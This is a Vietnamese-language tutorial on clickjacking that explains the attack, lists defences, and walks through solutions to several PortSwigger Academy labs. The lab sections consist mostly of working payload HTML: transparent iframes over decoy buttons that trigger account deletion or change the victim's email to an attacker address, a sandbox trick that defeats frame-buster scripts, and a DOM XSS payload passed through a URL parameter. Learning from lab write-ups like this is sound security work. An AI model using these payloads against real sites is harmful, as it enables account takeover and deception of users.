# Clickjacking

Nhân dịp trên mạng đang nổi trội những người thân bạn bè pay acc fb ngay trong 1 đêm thì mình có cảm hứng để làm về lổ hỗng [Clickjacking](https://portswigger.net/web-security/clickjacking)

## Clickjacking là gì ?
Nói ngắn gọn dễ hiểu nhất là một hình thức tấn công đánh lừa người dùng nhấp chuột vô ý vào một đối tượng trên website(ví dụ cụ thể ở đây là fb). Khi nhấp chuột vào một đối tượng trên màn hình, người dùng nghĩ là mình đang click vào đối tượng đó nhưng thực chất họ đang bị lừa click vào một đối tượng khác > đã bị làm mờ hay ẩn đi. Kẻ tấn công có thể sử dụng kỹ thuật tấn công này cho nhiều mục đích. Đánh cắp tài khoản người dùng, lừa click vào quảng cáo để kiếm tiền, lừa like page hoặc nguy hiểm hơn là cài một webshell lên máy chủ web.
## Có thể khai thác lỗ hổng này như thế nào ??
```
  + Hacker có thể lấy cắp thông tin đăng nhập của bạn thông qua 1 cái form fake trông có vẻ giống giống trang thật.
  + Lừa người dùng mở web-cam hoặc microphone bằng cách hiển thị các yếu tố vô hình trên trang cài đặt Adobe Flash.
  + Phát tán worms trên các trang mạng xã hội.
  + Phát tán malware bằng cách chuyển hướng người dùng tới link download chương trình độc hại.
  + Quảng cáo lừa đảo.
```
## Cách ngăn chặn Clickjacking

Clickjacking tấn công bằng cách bao bọc trang web mà người dùng tin tưởng bởi *iframe* sau đó render ẩn phần tử này lên trên cùng. Để ngăn chặn lỗ hổng này các bạn có thể sử dụng các cách sau :
```
  + X-Frame-Options
  + Content Security Policy
  + Frame-Killing

``` 
## Clickjacking Lab
  
### Lab: Basic clickjacking with CSRF token protection
Bài lab đã mô tả rõ ràng cho chúng ta cách thức để exploit lỗ hổng này chính là khai thác nút Delete Account bằng cách tạo ra 1 nút ảo đè lên và đánh lừa người dùng. 
Account : wiener:peter

Có 1 vài chỉ dẫn về struct của html mà chúng ta sẽ exploit như sau : 
```
<head>
  <style>
    #target_website {
      position:relative;
      width:128px;
      height:128px;
      opacity:0.00001;
      z-index:2;
      }
    #decoy_website {
      position:absolute;
      width:300px;
      height:400px;
      z-index:1;
      }
  </style>
</head>
...
<body>
  <div id="decoy_website">
  ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```
Tuy nhiên để phù hợp với HTML của trang web mà chúng ta đã đăng nhập vào và tương ứng với nút DeleteAccount thì chúng ta sẽ thay đổi như sau :
```
<style>
   iframe {
       position:relative;
       width: 500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:520px;
       left:50px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://acd31f081eacf731806c6b3f00a900a1.web-security-academy.net/my-account"></iframe>

```




### Lab: Clickjacking with form input data prefilled from a URL parameter
Như mô tả thì đây là bài mở rộng của lab trên nên về cơ bản các bước chúng ta cũng làm tương tự như trên.

Tuy nhiên vì đây là chức năng update email. chúng ta có thể dùng nó để update email của chúng ta và leak thông tin.
Dùng burpSuite để bắt lại request khi update email.



Điều đó làm thay đổi cấu trúc của link mà chúng ta chèn vào trong khung HTML được dựng: 
```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:440px;
       left:50px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe src="https://acfc1f101e46e458806d5c3d00b0004c.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Phần *email=hacker@attacker-website.com* chính là phần chúng ta thêm email của hacker để leak thông tin.



### Lab: Clickjacking with a frame buster script
Bài lab này đã cho chúng ta biết dùng lại kỹ thuật của 2 bài lab trên là vô dụng, và đưa ra 1 hướng mới cho chúng ta khai thác.
```
Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe sandbox attribute. When this is set with the allow-forms or allow-scripts values and the allow-top-navigation value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:

<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```
Như vậy là chúng ta đã có hướng giải quyết cho vấn đề, chúng ta dùng sandbox = allow-forms để vô hiệu hóa.
```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:440px;
       left:50px;
       z-index: 1;
   }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms"
src="https://ac6f1fa31ecac23380c4079b000d00fe.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Để có được payload như trên phải căn chỉnh nhiều lần để rút ra được những thông số như thế.


### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

```
<style>
   iframe {
       position:relative;
       width:500px;
       height: 700px;
       opacity: 0.0001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:635px;
       left:60px;
       z-index: 1;
   }
</style>
<div>click me</div>
<iframe
src="https://acb41f951f633851803d2471000c00bf.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```



### Lab: Multistep clickjacking

```
<style>
   iframe {
       position:relative;
       width:$width_value;
       height: $height_value;
       opacity: $opacity;
       z-index: 2;
   }
   .firstClick, .secondClick {
       position:absolute;
       top:$top_value1;
       left:$side_value1;
       z-index: 1;
   }
   .secondClick {
       top:$top_value2;
       left:$side_value2;
   }
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="$url"></iframe>
```
